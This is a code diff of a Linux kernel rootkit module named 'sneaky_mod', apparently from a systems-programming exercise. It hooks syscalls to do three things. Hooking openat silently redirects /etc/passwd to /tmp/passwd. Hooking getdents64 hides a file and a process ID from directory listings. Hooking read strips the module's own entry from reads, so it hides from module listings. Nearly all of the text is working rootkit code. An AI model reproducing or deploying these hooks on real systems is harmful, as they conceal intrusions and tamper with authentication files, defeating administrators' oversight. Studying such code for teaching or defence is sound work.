@@ -8,19 +8,9 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
-//#include <sys/types.h> // ino64_t, off64_t
+#include <linux/dirent.h> // for struct linux_dirent64
 
 #define PREFIX "sneaky_process"
-
-// linux_dirent object
-// TODO: linux_dirent or linux_dirent64
-struct linux_dirent64 {
-  u64 d_ino;
-  s64 d_off;
-  unsigned short d_reclen;
-  unsigned char d_type;
-  char d_name[];
-};
 
 // Command line argument for modules
 static int sneaky_PID;
@@ -57,8 +47,6 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
-  //return (*original_openat)(regs);
-
   char * pathname = (char *) regs->si;
   if (strstr(pathname, "/etc/passwd") != NULL) {
     copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd"));
@@ -69,8 +57,8 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 // Function pointer for 'getdents64' syscall
 asmlinkage int (*original_getdents64)(struct pt_regs *);
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
-// asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 * dirp, unsigned int count){
   // Implement the sneaky part here
+  char sneakyID_buffer[10];
   struct linux_dirent64 *d;
   int bpos, nread;
   
@@ -80,16 +68,12 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
   if(nread == -1){
     printk(KERN_INFO "Error in calling original gendents64\n");
   }
-  else if (nread == 0){
-    return 0;
-  }
-  else{
+  else if (nread > 0){
     for(bpos = 0; bpos < nread;){
       d = (struct linux_dirent64 *)(dirp + bpos);
 
-      char cmd_buffer[10];
-      snprintf(cmd_buffer, 10, "%d", sneaky_PID);
-      if ((strcmp(d->d_name, PREFIX) == 0) || (strcmp(d->d_name, cmd_buffer) == 0)) {
+      snprintf(sneakyID_buffer, 10, "%d", sneaky_PID);
+      if ((strcmp(d->d_name, PREFIX) == 0) || (strcmp(d->d_name, sneakyID_buffer) == 0)) {
       //if(memcmp(PREFIX, d->d_name, strlen(PREFIX)) == 0 ){
         memmove((char*) dirp + bpos, (char*) dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
         nread -= d->d_reclen; 
@@ -106,23 +90,20 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
 // Function pointer for 'read' syscall
 asmlinkage ssize_t (*original_read)(struct pt_regs *);
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
-  char *line_start = NULL, *line_end = NULL, *buf = regs->si;
+  char *find_sneaky = NULL, *end_line = NULL, *buf = (char *) regs->si;
   ssize_t nread = original_read(regs);
 
    if(nread == -1){
     printk(KERN_INFO "Error in calling original gendents64\n");
   }
-  else if (nread == 0){
-    return 0;
-  }
-  else{
-    line_start = strstr(buf, "sneaky_mod ");
-    if (line_start != NULL) {
-      line_end = strchr(line_start, '\n');
-      if(line_end !=NULL){
-        line_end++;
-        memmove(line_start, line_end, (char __user*)(buf + nread) - line_end);
-        nread -= (ssize_t)(line_end - line_start);
+  else if (nread > 0){
+    find_sneaky = strstr(buf, "sneaky_mod ");
+    if (find_sneaky != NULL) {
+      end_line = strchr(find_sneaky, '\n');
+      if(end_line !=NULL){
+        end_line++;
+        memmove(find_sneaky, end_line, nread - (end_line - buf));
+        nread -= (ssize_t)(end_line - find_sneaky);
       }
     }
   }
